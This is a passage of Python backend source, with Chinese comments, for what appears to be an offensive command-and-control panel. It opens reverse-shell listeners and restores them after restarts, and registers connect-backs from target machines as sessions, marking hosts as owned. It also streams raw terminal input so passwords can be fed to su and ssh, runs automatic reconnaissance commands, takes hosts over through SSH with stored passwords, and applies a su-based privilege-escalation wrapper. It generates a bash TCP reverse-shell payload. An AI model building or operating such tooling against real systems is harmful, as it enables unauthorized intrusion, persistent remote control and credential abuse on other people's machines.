        lis, replaced = REVERSE_SERVICE.open(
            bind, form.port, form.label, replace_pending=form.replacePending)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "listen", "error": str(e)})
    _persist_listener(lis)
    connected = lis.wait(form.waitS) if form.waitS and form.waitS > 0 else False
    # 兼容旧契约（返回 bash 载荷字符串）：改由载荷库生成，与面板下拉里的同一条一致
    payload = payload_svc.render("bash-tcp", bind, form.port)["cmd"]
    return {"ok": True, "listener": lis.to_dict(), "replaced": replaced, "connected": connected,
            "payload": payload}


def _persist_listener(lis) -> None:
    """监听写入持久表（面板重启后自动恢复）；同地址端口的旧记录先清掉。"""
    db = get_session_factory()()
    try:
        db.query(ReverseListener).filter(
            ReverseListener.bind == lis.bind,
            ReverseListener.port == lis.port,
            ReverseListener.id != lis.id,
        ).delete(synchronize_session=False)
        if db.get(ReverseListener, lis.id) is None:
            db.add(ReverseListener(
                id=lis.id, bind=lis.bind, port=lis.port, label=lis.label,
                created_at=now().strftime("%Y-%m-%d %H:%M:%S"),
            ))
        db.commit()
    finally:
        db.close()


def restore_reverse_listeners() -> dict:
    """按持久表恢复监听（面板启动时调用）。

    地址已失效（休眠 / 换网）或端口被占时不删记录，把原因记入 RESTORE_ERRORS：
    前端在监听列表里显示为「未恢复」，可用「重试恢复」重新拉起。
    """
    RESTORE_ERRORS.clear()
    db = get_session_factory()()
    restored, failed = 0, []
    try:
        for row in db.query(ReverseListener).all():
            try:
                REVERSE_SERVICE.open(row.bind, row.port, row.label,
                                     replace_pending=False, listener_id=row.id)
                restored += 1
            except Exception as e:  # 单个监听恢复失败不影响其余
                RESTORE_ERRORS[row.id] = str(e)
                failed.append({"id": row.id, "bind": row.bind, "port": row.port,
                               "error": str(e)})
    finally:
        db.close()
    return {"restored": restored, "failed": failed}


@router.get("/shells/reverse/listeners")
def reverse_listeners():
    """监听列表 = 进程内活跃监听 + 持久表里尚未恢复的监听（含失败原因）。"""
    active = {l["id"]: l for l in REVERSE_SERVICE.list()}
    db = get_session_factory()()
    try:
        rows = db.query(ReverseListener).all()
    finally:
        db.close()
    out = []
    for r in rows:
        item = active.pop(r.id, None)
        if item is None:
            item = {"id": r.id, "bind": r.bind, "port": r.port, "label": r.label,
                    "connected": False, "peer": None, "active": False, "consumed": False,
                    "error": RESTORE_ERRORS.get(r.id, "")}
        else:
            item["active"] = True
            item["error"] = ""
        out.append(item)
    for item in active.values():  # 进程内但未落库（理论上不会出现）
        item["active"] = True
        item["error"] = ""
        out.append(item)
    return {"listeners": out}


@router.post("/shells/reverse/listeners/restore")
def reverse_listeners_restore():
    """重试恢复启动时失败的监听（换网后地址又回来了等场景）。"""
    return restore_reverse_listeners()


@router.delete("/shells/reverse/listeners/{listener_id}")
def reverse_listener_close(listener_id: str):
    """关闭单个监听（释放端口）并删除持久记录。"""
    ok = REVERSE_SERVICE.close(listener_id)
    db = get_session_factory()()
    try:
        row = db.get(ReverseListener, listener_id)
        if row is not None:
            db.delete(row)
            db.commit()
            ok = True
    finally:
        db.close()
    RESTORE_ERRORS.pop(listener_id, None)
    return {"ok": ok}


@router.delete("/shells/reverse/listeners")
def reverse_listener_close_all():
    """关闭全部监听（休眠 / 收尾后清理残留端口）并清空持久记录。"""
    closed = REVERSE_SERVICE.close_all()
    db = get_session_factory()()
    try:
        db.query(ReverseListener).delete(synchronize_session=False)
        db.commit()
    finally:
        db.close()
    RESTORE_ERRORS.clear()
    return {"ok": True, "closed": closed}


class ReverseIOIn(BaseModel):
    """交互式通道读写：喂密码/读取交互程序输出（su / ssh / mysql 等）。"""

    data: str = ""            # send 时写入通道的原始文本
    until: list[str] = []     # read 时等待命中的模式
    timeout: float = 20.0


@router.post("/shells/{shell_id}/io")
def reverse_io(shell_id: str, form: ReverseIOIn, db: DBSession = Depends(get_db)):
    """反弹通道的原始读写（仅 kind=reverse 会话可用；用于交互式程序）。"""
    s = _get_shell(db, shell_id)
    ch = REVERSE_CHANNELS.get(shell_id)
    if ch is None:
        return JSONResponse({"ok": False, "stage": "channel",
                             "error": "该会话不是活跃反弹通道（或已断开）"})
    if form.data:
        try:
            ch.send_raw(form.data)
        except OSError as e:
            return JSONResponse({"ok": False, "stage": "write", "error": str(e)})
    if form.until:
        text, hit = ch.read_until(form.until, timeout=form.timeout)
        return {"ok": True, "hit": hit, "text": text}
    return {"ok": True, "hit": "", "text": ""}


#: 控制键 → 实际写入 PTY 的字节（终端面板按钮 / 键盘快捷键使用）
KEY_SEQ = {
    "ctrl-c": "\x03", "ctrl-d": "\x04", "ctrl-z": "\x1a",
    "tab": "\t", "enter": "\r", "esc": "\x1b",
    "up": "\x1b[A", "down": "\x1b[B", "left": "\x1b[D", "right": "\x1b[C",
}


class RawInputIn(BaseModel):
    """原始输入：data 直接写入 PTY；key 走控制键映射（Ctrl+C / Tab / 回车等）。"""

    data: str = ""
    key: str = ""


class RawModeIn(BaseModel):
    on: bool = True


def _channel_of(db: DBSession, shell_id: str):
    s = _get_shell(db, shell_id)
    if getattr(s, "kind", "") != "reverse":
        raise HTTPException(400, "仅反弹 Shell 会话支持原始交互")
    ch = REVERSE_CHANNELS.get(shell_id)
    if ch is None:
        raise HTTPException(409, "反弹通道不存在或已断开（请重新监听并让靶机回连）")
    return s, ch


@router.post("/shells/{shell_id}/input")
def shell_raw_input(shell_id: str, form: RawInputIn, db: DBSession = Depends(get_db)):
    """原始输入（反弹通道专用）：直接写进目标 PTY，不做哨兵同步。

    交互式程序（mysql / su / vim）与长命令（ping）因此不会卡住会话；
    Ctrl+C 用 key=ctrl-c 发送。
    """
    s, ch = _channel_of(db, shell_id)
    text = form.data or KEY_SEQ.get(str(form.key or "").lower(), "")
    if not text:
        raise HTTPException(400, "空输入（data 与 key 至少给一个）")
    try:
        ch.write_raw(text)
    except OSError as e:
        return JSONResponse({"ok": False, "stage": "write", "error": f"写入失败：{e}"})
    s.last_beat_at = now()
    db.commit()
    return {"ok": True, "bytes": len(text.encode("utf-8"))}


@router.post("/shells/{shell_id}/raw")
def shell_raw_mode(shell_id: str, form: RawModeIn, db: DBSession = Depends(get_db)):
    """开关原始输出推送：打开后该会话的目标侧输出逐块推给面板终端（真实提示符可见）。

    on 幂等且总是重建订阅：只按 RAW_SINKS 判存在会让「表里有、通道上没有」的
    陈旧条目永远无法恢复（表现为终端一片空白）。
    """
    s, ch = _channel_of(db, shell_id)
    if form.on:
        old = RAW_SINKS.pop(shell_id, None)
        if old is not None:
            ch.remove_raw_sink(old)

        def _sink(text: str, sid: str = shell_id) -> None:
            manager.push("shell.output", shellId=sid, kind="raw", line=text)

        ch.add_raw_sink(_sink)
        RAW_SINKS[shell_id] = _sink
        history = ch.recent_output()
        if history:
            _sink(history)  # 回放缓冲尾部：补回连接横幅 / 首屏提示符等历史细节
    else:
        sink = RAW_SINKS.pop(shell_id, None)
        if sink is not None:
            ch.remove_raw_sink(sink)
    return {"ok": True, "raw": bool(form.on)}


@router.post("/shells/reverse/register")
def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
    """把已回连的通道登记为面板会话（kind=reverse），后续 exec/文件/固化全部复用会话层。

    主机解析顺序（任一命中即用，避免"必须先有 WebShell 才能登记反弹"的隐性前置）：
    1. 显式 hostId（须属于本项目）
    2. 回连对端 IP 命中的既有主机
    3. 显式 hostIp 命中的既有主机
    4. 用回连对端 IP 或 hostIp **自动创建**主机（发现方式记为「反弹回连」）
    """
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)

    try:
        lis = REVERSE_SERVICE.get(form.listenerId)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "listener", "error": str(e)})
    if not lis.connected.is_set():
        return JSONResponse({"ok": False, "stage": "callback",
                             "error": "尚无回连（请先在靶机执行反弹命令，或确认监听 bind 地址正确）"})

    peer = getattr(lis, "peer", None) or ("?", 0)
    peer_ip = str(peer[0] or "")

    host = None
    new_host = None
    if form.hostId:
        cand = db.get(Host, form.hostId)
        if cand is not None and cand.project_id == project.id:
            host = cand
    for ip in (peer_ip, form.hostIp):
        if host is not None or not ip or ip == "?":
            continue
        host = db.query(Host).filter(Host.project_id == project.id, Host.ip == ip).first()
        if host is None:
            host = Host(
                id=rid("h"), project_id=project.id, ip=ip, hostname="", os="",
                layer="L1", segment=_seg_of_ip(ip), privilege="", owned=False,
                ports=[], services=[], note="反弹 Shell 回连自动登记",
                discovery="反弹回连",
            )
            db.add(host)
            db.flush()
            new_host = host
            add_event(db, project.id, "host", f"反弹回连自动登记主机 {ip}", host_id=host.id,
                      detail="由反弹会话登记自动创建（无需预先手动登记主机）")
    if host is None:
        return JSONResponse({
            "ok": False, "stage": "host",
            "error": "无法确定会话所属主机：回连对端 IP 未知。请在下面的下拉里手动指定主机，"
                     "或先用「添加 Shell」登记该主机。",
            "peer": list(peer),
        })

    try:
        ch = lis.take()
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "channel", "error": str(e)})

    s = Shell(
        id=rid("s"), project_id=project.id, host_id=host.id, type=form.type,
        kind="reverse", url=f"reverse://{ch.peer[0]}:{ch.peer[1]}", pwd="",
        encoder="none", alive=False, latency=0, last_beat_at=None,
        hostname=host.hostname, privilege=host.privilege, stable=False,
    )
    db.add(s)
    db.flush()
    REVERSE_CHANNELS[s.id] = ch

    def _mark_lost(sid: str = s.id) -> None:
        """通道 EOF：把会话标记断线并广播（列表绿点必须与真实通道一致）。"""
        db2 = get_session_factory()()
        try:
            row = db2.get(Shell, sid)
            if row is not None and row.alive:
                row.alive = False
                row.latency = 0
                db2.commit()
                manager.push("shell.beat", shellId=sid, alive=False, latency=0,
                             lastBeat=ShellOut.of(row).lastBeat)
        except Exception:
            pass
        finally:
            db2.close()

    ch.add_eof_hook(_mark_lost)

    collect_detail = ""
    t = ch.test()
    s.alive = t.ok
    s.latency = t.ms if t.ok else 0
    s.last_beat_at = now() if t.ok else None
    if t.ok:
        # 平台按回连回显识别（不再固定 linux）：决定后续文件命令与终端固化技法选择
        platform = detect_platform(ch) or "linux"
        ch.platform = platform
        s.platform = platform
    if t.ok and form.autoCollect:
        probe = ("whoami; ver; hostname" if s.platform == "windows"
                 else "id; uname -a; hostname")
        info = ch.exec(probe)
        collect_detail = _collect_host_info(db, host, info.output)
    if s.alive:
        host.owned = True

    add_event(db, project.id, "shell",
              f"反弹 Shell 回连成功并登记：{ch.peer[0]}:{ch.peer[1]}",
              host_id=host.id,
              detail=f"监听 {lis.bind}:{lis.port} · 延迟 {s.latency}ms"
                     + (f" · {collect_detail}" if collect_detail else ""))
    db.commit()
    if new_host is not None:
        manager.push("host.found", host=HostOut.of(new_host).model_dump())
    out = ShellOut.of(s)
    manager.push("shell.created", shell=out.model_dump())
    return {"ok": True, "shell": out.model_dump(), "listener": lis.to_dict()}


# ---------------------------------------------------------------------------
# SSH 会话纳管（A7）：直接以 SSH 协议纳管主机，比 HTTP 马更稳
# ---------------------------------------------------------------------------

@router.post("/shells/ssh")
def ssh_register(form: SshIn, db: DBSession = Depends(get_db)):
    """把一台主机以 SSH 会话纳管（kind=ssh）。

    流程：1) 真实连接测试（connect + test）；2) 成功才落库 Shell 与（必要时）
    自动创建主机；失败返回真实错误且**不**创建记录。

    主机解析顺序（任一命中即用）：
    1. 显式 hostId（须属于本项目）
    2. 同 IP 既有主机（autoHost 时）
    3. 用 form.host 自动创建主机（发现方式记为「SSH 会话」）
    """
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)

    # 1) 真实连接测试（失败如实返回，不落库）
    sess = SshSession(
        host=form.host, port=form.port, username=form.username, password=form.password,
        key_path=form.keyPath, key_passphrase=form.keyPassphrase,
        platform=form.platform or "linux",
    )
    try:
        sess.connect()
        t = sess.test()
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "connect", "error": str(e)})
    if not t.ok:
        sess.close()
        return JSONResponse({"ok": False, "stage": "test",
                              "error": t.error or "SSH 连接测试无回显"})

    # 平台与主机名取连接后真实探测结果
    platform = sess.platform or "linux"
    s_hostname = sess._hostname

    # 2) 主机解析：hostId → 同 IP 既有主机 → 自动创建
    host = None
    new_host = None
    if form.hostId:
        cand = db.get(Host, form.hostId)
        if cand is not None and cand.project_id == project.id:
            host = cand
    if host is None and form.autoHost:
        host = db.query(Host).filter(
            Host.project_id == project.id, Host.ip == form.host
        ).first()
        if host is None:
            host = Host(
                id=rid("h"), project_id=project.id, ip=form.host, hostname=s_hostname,
                os="", layer="L1", segment=_seg_of_ip(form.host), privilege="",
                owned=False, ports=[], services=[], note="SSH 会话自动登记",
                discovery="SSH 会话",
            )
            db.add(host)
            db.flush()
            new_host = host
            add_event(db, project.id, "host", f"SSH 会话自动登记主机 {form.host}",
                      host_id=host.id,
                      detail="由 SSH 会话纳管自动创建（无需预先手动登记主机）")
    if host is None:
        sess.close()
        return JSONResponse({
            "ok": False, "stage": "host",
            "error": "无法确定会话所属主机：请先指定 hostId 或允许自动创建主机（autoHost）。",
        })

    # 3) 落库 Shell(kind=ssh)；url 约定 ssh://user@host:port，pwd 存密码
    s = Shell(
        id=rid("s"), project_id=project.id, host_id=host.id, type="SSH 会话",
        kind="ssh", url=f"ssh://{form.username}@{form.host}:{form.port}",
        pwd=form.password, encoder="none", alive=True, latency=t.ms,
        last_beat_at=now(), hostname=s_hostname, privilege=host.privilege,
        stable=False, platform=platform,
    )
    db.add(s)
    db.flush()

    collect_detail = ""
    if form.autoCollect:
        probe = ("whoami; ver; hostname" if platform == "windows"
                 else "id; uname -a; hostname")
        info = sess.exec(probe)
        collect_detail = _collect_host_info(db, host, info.output)
    sess.close()

    if s.alive:
        host.owned = True

    add_event(db, project.id, "shell",
              f"SSH 会话纳管成功：{form.username}@{form.host}:{form.port}",
              host_id=host.id,
              detail=f"协议 SSH · 延迟 {s.latency}ms · 平台 {platform}"
                     + (f" · {collect_detail}" if collect_detail else ""))
    db.commit()
    if new_host is not None:
        manager.push("host.found", host=HostOut.of(new_host).model_dump())
    out = ShellOut.of(s)
    manager.push("shell.created", shell=out.model_dump())
    return {"ok": True, "shell": out.model_dump(),
            "hostname": s_hostname, "platform": platform}


# ---------------------------------------------------------------------------
# 提权上下文：WebShell 无状态，验证拿到 root 后把后续命令套进包装器执行
# ---------------------------------------------------------------------------

class EscalationIn(BaseModel):
    user: str = ""
    #: 包装器模板，%CMD% 为占位符，如 script -qc "su ph -c %CMD%" /dev/null
    wrapper: str = ""


@router.post("/shells/{shell_id}/escalation", response_model=ShellOut)
def set_escalation(shell_id: str, form: EscalationIn, db: DBSession = Depends(get_db)):
    """设置提权上下文：此后该会话的命令/文件操作都以 form.user 身份执行。"""
    s = _get_shell(db, shell_id)
    user = (form.user or "").strip()
    wrapper = (form.wrapper or "").strip()
    if not user:
        raise HTTPException(400, "需要提权用户名")
    if wrapper and "%CMD%" not in wrapper:
        raise HTTPException(400, "wrapper 必须包含 %CMD% 占位符（或留空：交互会话已 su）")
    s.escalated_user = user
    s.escalation_wrapper = wrapper
    db.commit()
    out = ShellOut.of(s)
    manager.push("shell.escalation", shellId=s.id, escalatedUser=user)
    return out


@router.delete("/shells/{shell_id}/escalation", response_model=ShellOut)
def clear_escalation(shell_id: str, db: DBSession = Depends(get_db)):
    """取消提权上下文（回到原用户执行）。"""
    s = _get_shell(db, shell_id)
    s.escalated_user = ""
    s.escalation_wrapper = ""
    db.commit()
    out = ShellOut.of(s)
    manager.push("shell.escalation", shellId=s.id, escalatedUser="")
    return out
